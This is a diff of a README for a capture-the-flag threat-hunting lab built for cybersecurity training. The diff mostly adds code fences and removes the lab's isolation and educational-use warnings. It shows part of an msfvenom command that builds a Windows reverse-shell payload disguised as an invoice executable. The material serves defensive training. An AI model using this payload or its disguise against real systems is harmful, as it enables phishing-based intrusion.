@@ -1,4 +1,4 @@
-# MDClinic CTF Lab — Advanced Threat Hunting Challenge
+# MDClinic CTF Lab — Threat Hunting Challenge
 
 [![License](https://img.shields.io/badge/License-Educational-blue)]()
 [![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate%2FAdvanced-red)]()
@@ -50,7 +50,7 @@ Attack Vector:    “Open Attachment” button click
 
 
 ### Complete Attack Chain
-
+```
 ┌─────────────────────────────────────────────────────────────────┐
 │ PHASE 1: INITIAL ACCESS                                        │
 ├─────────────────────────────────────────────────────────────────┤
@@ -93,8 +93,8 @@ Attack Vector:    “Open Attachment” button click
 │                                                                  │
 └─────────────────────────────────────────────────────────────────┘
 
----
-
+```
+```
 ## 🏗️ Architecture & Infrastructure
 
 ### Lab Environment Diagram
@@ -146,7 +146,7 @@ Attack Vector:    “Open Attachment” button click
 │ • WinEvent IDs:  │  │ • WinEvent IDs:  │
 │   4688,4698,7045 │  │   4688,4698      │
 └──────────────────┘  └──────────────────┘
-
+```
 
 
 ### Technology Stack
@@ -191,7 +191,7 @@ msfvenom -p windows/x64/shell/reverse_tcp \
   LPORT=4444 \
   -f exe -o Invoice_INV-2026-015.exe
 
-
+```
 Execution Method:
 
 	•	Filename: Invoice_INV-2026-015.exe (disguised as PDF)
@@ -405,16 +405,6 @@ Key Artifacts to Discover:
 	•	✅ File creation in suspicious paths (FLAG locations)
 	•	✅ System behavior anomalies in SIEM logs
 
-🛡️ Lab Security Notes
-
-⚠️ Important:
-
-	•	This lab runs in isolated Host-only network
-	•	Do NOT connect to production networks
-	•	Change default credentials before sharing
-	•	All logs retained for post-investigation analysis
-	•	For educational purposes only
-
 ℹ️ Lab Information
 
 Property	Value
@@ -431,5 +421,3 @@ Language	English/Arabic
 Ahad Alotaibi
 
 Developed for Tuwaiq Academy Cyber Threat Hunting Training
-
-Ready to investigate? Begin your threat hunt! 🔍
